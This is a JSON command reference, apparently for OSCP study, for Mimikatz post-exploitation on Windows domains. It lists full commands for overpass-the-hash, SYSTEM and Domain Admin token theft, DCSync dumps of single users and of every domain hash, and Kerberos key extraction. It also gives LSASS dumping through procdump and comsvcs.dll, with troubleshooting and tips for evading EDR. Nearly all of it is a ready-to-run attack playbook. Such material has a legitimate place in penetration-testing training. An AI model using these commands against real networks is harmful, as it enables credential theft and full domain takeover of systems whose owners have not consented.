{
  "metadata": {
    "file_purpose": "Mimikatz Post-Exploitation Commands - Credential harvesting and privilege escalation after gaining local admin access",
    "oscp_relevance": "Critical post-exploitation phase. After landing on a machine with local admin, these commands extract credentials for lateral movement and domain escalation.",
    "educational_context": "Post-exploitation with mimikatz follows a priority order: (1) sekurlsa for active sessions, (2) lsadump for stored credentials, (3) token manipulation for privilege escalation. Always run privilege::debug first.",
    "prerequisites": [
      "Local Administrator access on target machine",
      "Mimikatz binary transferred to target",
      "AV/EDR bypassed or disabled"
    ],
    "attack_chain": [
      "1. Gain local admin shell on target",
      "2. Transfer mimikatz to target",
      "3. Run privilege::debug to verify admin rights",
      "4. Harvest credentials with sekurlsa::logonpasswords",
      "5. Export Kerberos tickets with sekurlsa::tickets",
      "6. Dump local hashes with lsadump::sam",
      "7. Extract service passwords with lsadump::secrets",
      "8. Use harvested creds for lateral movement"
    ]
  },
  "commands": [
    {
      "id": "mimikatz-overpass-the-hash",
      "name": "Overpass-the-Hash (Pass-the-Key)",
      "category": "active-directory",
      "subcategory": "credential-attacks",
      "command": "mimikatz.exe \"sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe\"",
      "description": "Convert NTLM hash to Kerberos ticket by requesting TGT from KDC. Opens new cmd.exe with Kerberos context. Unlike Pass-the-Hash (NTLM auth), this enables Kerberos-based lateral movement.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "KERBEROS",
        "CREDENTIAL_ATTACKS",
        "PASS_THE_HASH",
        "LATERAL_MOVEMENT",
        "MIMIKATZ",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<USERNAME>",
          "description": "Target username (without domain prefix)",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain FQDN (not NetBIOS name)",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32 hex chars) obtained from sekurlsa::logonpasswords or lsadump::sam",
          "example": "aad3b435b51404eeaad3b435b51404ee",
          "required": true
        }
      ],
      "flag_explanations": {
        "sekurlsa::pth": "Pass-the-Hash module that creates a new process with injected credentials. Unlike standard PTH (NTLM), this requests a Kerberos TGT from the KDC using the NTLM hash, enabling Kerberos-based authentication.",
        "/user": "Target username without domain prefix. The domain is specified separately with /domain.",
        "/domain": "Target domain FQDN. CRITICAL: Use FQDN (corp.com) not NetBIOS (CORP). Kerberos requires proper domain format.",
        "/ntlm": "NTLM hash (NT hash, not LM). 32 hexadecimal characters. Obtained from sekurlsa::logonpasswords, lsadump::sam, or secretsdump.py.",
        "/run": "Program to launch with the new Kerberos context. Default: cmd.exe. Can specify any executable (powershell.exe, mmc.exe, etc.)."
      },
      "success_indicators": [
        "New cmd.exe window opens",
        "user: <username>",
        "domain: <domain>",
        "program: cmd.exe",
        "NTLM hash: <hash>",
        "Running 'cmd.exe' as <DOMAIN>\\<username>"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_pth",
        "User not found",
        "Authentication failed",
        "KDC_ERR_C_PRINCIPAL_UNKNOWN"
      ],
      "troubleshooting": {
        "KDC_ERR_C_PRINCIPAL_UNKNOWN": "User doesn't exist in AD. Verify username with: net user <username> /domain. Check for typos.",
        "New window opens but no Kerberos ticket": "DC may be unreachable. Verify: nltest /dsgetdc:<domain>. Check firewall allows Kerberos (TCP/UDP 88).",
        "Hash format invalid": "Ensure 32 hex characters (0-9, a-f). No colons or spaces. Just the NT hash, not 'LM:NT' format."
      },
      "notes": "CRITICAL: After Overpass-the-Hash, use HOSTNAME not IP!\n\n  CORRECT: dir \\\\DC01\\C$ (Kerberos auth, uses ticket)\n  WRONG: dir \\\\10.0.0.1\\C$ (NTLM auth, ignores ticket!)\n\nIP addresses force Windows to use NTLM instead of Kerberos. The forged ticket is only used for Kerberos authentication.\n\nVerify ticket with: klist (in the new window)\n\nTime estimate: <10 seconds",
      "oscp_relevance": "high",
      "prerequisites": [
        "mimikatz-sekurlsa-logonpasswords"
      ],
      "next_steps": [
        "ad-golden-ticket-mimikatz-create",
        "ad-silver-ticket-mimikatz-create"
      ],
      "alternatives": [
        "impacket-psexec",
        "impacket-wmiexec"
      ],
      "filled_example": "mimikatz.exe \"sekurlsa::pth /user:administrator /domain:corp.com /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe\""
    },
    {
      "id": "mimikatz-token-elevate",
      "name": "Elevate to SYSTEM Token",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"exit\"",
      "description": "Elevate current mimikatz process to SYSTEM token by stealing from a SYSTEM process. Required before lsadump commands. Provides highest local privilege level.",
      "tags": [
        "POST_EXPLOIT",
        "PRIVILEGE_ESCALATION",
        "TOKEN_MANIPULATION",
        "MIMIKATZ",
        "SYSTEM",
        "OSCP:HIGH"
      ],
      "variables": [],
      "flag_explanations": {
        "privilege::debug": "Enables SeDebugPrivilege, required for accessing LSASS memory and manipulating other process tokens. Requires local admin rights.",
        "token::elevate": "Impersonates SYSTEM token by duplicating a token from a SYSTEM-level process (lsass.exe, winlogon.exe). Elevates mimikatz to SYSTEM context."
      },
      "success_indicators": [
        "Privilege '20' OK (SeDebugPrivilege enabled)",
        "Token Id  : 0",
        "User name : NT AUTHORITY\\SYSTEM",
        "SID name  : NT AUTHORITY\\SYSTEM"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_privilege_simple",
        "Privilege '20' not granted",
        "ERROR kuhl_m_token_elevate"
      ],
      "troubleshooting": {
        "Privilege '20' not granted": "Not running as local admin. Verify: whoami /groups (look for S-1-5-32-544 Administrators). Elevate shell first.",
        "token::elevate fails": "No SYSTEM process available or access denied. Try: token::elevate /domainadmin to steal DA token instead."
      },
      "notes": "Run BEFORE lsadump commands (sam, secrets, cache). SYSTEM token is required to access LSA secrets and SAM database.\n\nAlternative: token::elevate /domainadmin - steals Domain Admin token if available (useful for DCSync from workstation).\n\nVerify elevation: token::whoami\n\nTime estimate: <5 seconds",
      "oscp_relevance": "high",
      "prerequisites": [],
      "next_steps": [
        "mimikatz-lsadump-sam",
        "mimikatz-lsadump-secrets",
        "mimikatz-lsadump-cache"
      ],
      "alternatives": []
    },
    {
      "id": "mimikatz-token-elevate-domainadmin",
      "name": "Elevate to Domain Admin Token",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "mimikatz.exe \"privilege::debug\" \"token::elevate /domainadmin\" \"exit\"",
      "description": "Steal Domain Admin token from logged-in DA session. Enables domain-level operations (DCSync) from a workstation without being Domain Admin yourself.",
      "tags": [
        "POST_EXPLOIT",
        "PRIVILEGE_ESCALATION",
        "TOKEN_MANIPULATION",
        "DOMAIN_ADMIN",
        "MIMIKATZ",
        "OSCP:MEDIUM"
      ],
      "variables": [],
      "flag_explanations": {
        "privilege::debug": "Enables SeDebugPrivilege for cross-process token access.",
        "token::elevate /domainadmin": "Searches all processes for Domain Admin tokens and impersonates the first one found. Requires DA to be logged in on this machine."
      },
      "success_indicators": [
        "Token Id  : 0",
        "User name : <DOMAIN>\\<DA_username>",
        "SID name  : <DOMAIN>\\Domain Admins"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_token_elevate ; No token with domain admin",
        "No Domain Admin token found"
      ],
      "troubleshooting": {
        "No Domain Admin token found": "No DA is logged into this machine. Check sessions: qwinsta /server:<hostname>. Target machines with DA sessions detected by BloodHound."
      },
      "notes": "PRIORITY TARGET: Machines with DA sessions (detected by BloodHound HasSession edges).\n\nAfter stealing DA token, you can run DCSync from this workstation!\n  mimikatz # lsadump::dcsync /domain:corp.com /all\n\nTime estimate: <5 seconds (if DA session exists)",
      "oscp_relevance": "medium",
      "prerequisites": [],
      "next_steps": [
        "mimikatz-dcsync-all"
      ],
      "alternatives": [
        "mimikatz-sekurlsa-logonpasswords"
      ]
    },
    {
      "id": "mimikatz-token-revert",
      "name": "Revert to Original Token",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "mimikatz.exe \"token::revert\" \"exit\"",
      "description": "Revert from impersonated token (SYSTEM, DA) back to original user context. Useful for cleanup or when impersonation causes issues.",
      "tags": [
        "POST_EXPLOIT",
        "TOKEN_MANIPULATION",
        "CLEANUP",
        "MIMIKATZ",
        "OSCP:LOW"
      ],
      "variables": [],
      "flag_explanations": {
        "token::revert": "Reverts to the original process token, undoing any token::elevate impersonation."
      },
      "success_indicators": [
        "Reverting to original token"
      ],
      "failure_indicators": [],
      "notes": "Rarely needed. Use if SYSTEM context causes permission issues (network operations sometimes require user token).\n\nTime estimate: <1 second",
      "oscp_relevance": "low",
      "prerequisites": [],
      "next_steps": [],
      "alternatives": []
    },
    {
      "id": "mimikatz-dcsync-user",
      "name": "DCSync Single User",
      "category": "active-directory",
      "subcategory": "credential-extraction",
      "command": "mimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>\"",
      "description": "Extract password hash for a single user via DCSync (Directory Replication Service). Remote attack - no code execution on DC required. Requires DA or DCSync rights.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_EXTRACTION",
        "MIMIKATZ",
        "DOMAIN_ADMIN",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain FQDN",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<TARGET_USER>",
          "description": "Username to extract (e.g., Administrator, krbtgt, service accounts)",
          "example": "Administrator",
          "required": true
        }
      ],
      "flag_explanations": {
        "lsadump::dcsync": "Simulates Domain Controller replication to request password hashes. Uses MS-DRSR (Directory Replication Service Remote Protocol).",
        "/domain": "Target domain FQDN.",
        "/user": "Specific user account to extract. Common targets: Administrator, krbtgt (for Golden Ticket), service accounts."
      },
      "success_indicators": [
        "Object RDN           : <username>",
        "SAM Username         : <username>",
        "Hash NTLM: <32 hex chars>",
        "Credentials:"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105",
        "Access is denied",
        "The RPC server is unavailable"
      ],
      "troubleshooting": {
        "GetNCChanges: 0x00002105": "Insufficient privileges. Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights. Need Domain Admin or explicit DCSync rights.",
        "RPC server unavailable": "Cannot reach DC. Check: nltest /dsgetdc:<domain>. Verify firewall allows RPC (135, 445, dynamic)."
      },
      "notes": "TARGETED extraction - use for specific high-value accounts:\n  - krbtgt: For Golden Ticket\n  - Administrator: Domain admin access\n  - Service accounts: For Silver Tickets\n\nFor full domain dump, use /all flag instead.\n\nTime estimate: <30 seconds per user",
      "oscp_relevance": "high",
      "prerequisites": [],
      "next_steps": [
        "ad-golden-ticket-mimikatz-create",
        "ad-silver-ticket-mimikatz-create"
      ],
      "alternatives": [
        "ad-dcsync-impacket-secretsdump-user"
      ],
      "filled_example": "mimikatz.exe \"lsadump::dcsync /domain:corp.com /user:Administrator\""
    },
    {
      "id": "mimikatz-dcsync-all",
      "name": "DCSync All Domain Hashes",
      "category": "active-directory",
      "subcategory": "credential-extraction",
      "command": "mimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /all /csv\"",
      "description": "Extract ALL domain password hashes via DCSync. Complete domain credential dump. Output in CSV format for easy parsing.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_EXTRACTION",
        "DOMAIN_DUMP",
        "MIMIKATZ",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain FQDN",
          "example": "corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "lsadump::dcsync": "DCSync attack using directory replication protocol.",
        "/domain": "Target domain FQDN.",
        "/all": "Extract all user accounts in the domain.",
        "/csv": "Output in CSV format (easier to parse, import into tools)."
      },
      "success_indicators": [
        "Multiple user entries with NTLM hashes",
        "CSV format output: username,RID,NTLM,..."
      ],
      "failure_indicators": [
        "Access is denied",
        "GetNCChanges error"
      ],
      "notes": "FULL DOMAIN DUMP - game over for AD security.\n\nSave output: mimikatz \"log dcsync.txt\" \"lsadump::dcsync /domain:<DOMAIN> /all /csv\" \"exit\"\n\nImpacket alternative (usually faster):\n  secretsdump.py -just-dc '<DOMAIN>/<DA_USER>:<PASSWORD>'@<DC_IP>\n\nTime estimate: 1-5 minutes depending on domain size",
      "oscp_relevance": "high",
      "prerequisites": [],
      "next_steps": [
        "ad-golden-ticket-mimikatz-create"
      ],
      "alternatives": [],
      "filled_example": "mimikatz.exe \"lsadump::dcsync /domain:corp.com /all /csv\""
    },
    {
      "id": "mimikatz-sekurlsa-ekeys",
      "name": "Extract Kerberos Encryption Keys",
      "category": "active-directory",
      "subcategory": "credential-extraction",
      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::ekeys\" \"exit\"",
      "description": "Extract Kerberos encryption keys (AES128, AES256, DES, RC4) from LSASS memory. AES keys enable stealthier ticket forgery than NTLM hashes.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "KERBEROS",
        "CREDENTIAL_EXTRACTION",
        "AES_KEYS",
        "MIMIKATZ",
        "OSCP:MEDIUM"
      ],
      "variables": [],
      "flag_explanations": {
        "privilege::debug": "Required for LSASS memory access.",
        "sekurlsa::ekeys": "Extracts Kerberos encryption keys from all logon sessions. Shows AES256, AES128, DES-CBC-MD5, and RC4 (NTLM) keys."
      },
      "success_indicators": [
        "aes256_hmac",
        "aes128_hmac",
        "des_cbc_md5",
        "rc4_hmac_nt",
        "64 hex chars (AES256)",
        "32 hex chars (AES128/RC4)"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa",
        "Handle on memory"
      ],
      "notes": "AES keys are STEALTHIER for ticket forgery:\n  - RC4 tickets flagged by modern EDR\n  - AES256 is the modern standard\n\nUse AES key with Rubeus for Golden/Silver tickets:\n  Rubeus.exe golden /aes256:<AES_KEY> ...\n\nTime estimate: <10 seconds",
      "oscp_relevance": "medium",
      "prerequisites": [
        "mimikatz-privilege-debug"
      ],
      "next_steps": [
        "ad-golden-ticket-rubeus-create",
        "ad-silver-ticket-rubeus-create"
      ],
      "alternatives": [
        "mimikatz-sekurlsa-logonpasswords"
      ]
    },
    {
      "id": "mimikatz-minidump-parse",
      "name": "Parse LSASS Minidump Offline",
      "category": "post-exploit",
      "subcategory": "credential-extraction",
      "command": "mimikatz.exe \"sekurlsa::minidump <DUMP_FILE>\" \"sekurlsa::logonpasswords\" \"exit\"",
      "description": "Parse LSASS memory dump offline. Use when live extraction is blocked (Credential Guard, EDR). Dump created with procdump, comsvcs.dll, or Task Manager.",
      "tags": [
        "POST_EXPLOIT",
        "CREDENTIAL_EXTRACTION",
        "OFFLINE_ANALYSIS",
        "LSASS_DUMP",
        "MIMIKATZ",
        "OSCP:MEDIUM"
      ],
      "variables": [
        {
          "name": "<DUMP_FILE>",
          "description": "Path to LSASS memory dump file (.dmp)",
          "example": "lsass.dmp",
          "required": true
        }
      ],
      "flag_explanations": {
        "sekurlsa::minidump": "Loads a minidump file for offline analysis instead of accessing live LSASS process.",
        "sekurlsa::logonpasswords": "Extracts credentials from the loaded dump (same output as live extraction)."
      },
      "success_indicators": [
        "Opening : '<filename>'",
        "NTLM hashes and/or cleartext passwords displayed"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_minidump",
        "File not found",
        "Invalid dump format"
      ],
      "notes": "CREATE DUMP ON TARGET:\n  # Method 1: Task Manager (GUI)\n  Task Manager \u2192 Details \u2192 lsass.exe \u2192 Create dump file\n\n  # Method 2: Procdump (Sysinternals)\n  procdump.exe -ma lsass.exe lsass.dmp\n\n  # Method 3: comsvcs.dll (LOLBin - no tools needed)\n  rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full\n\n  # Get LSASS PID:\n  tasklist /fi \"imagename eq lsass.exe\"\n\nTRANSFER to attacker machine, parse with mimikatz or pypykatz.\n\nPypykatz (Linux alternative):\n  pypykatz lsa minidump lsass.dmp\n\nTime estimate: 1-2 minutes (dump creation + transfer + parse)",
      "oscp_relevance": "medium",
      "prerequisites": [],
      "next_steps": [
        "mimikatz-overpass-the-hash"
      ],
      "alternatives": [],
      "filled_example": "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\""
    }
  ]
}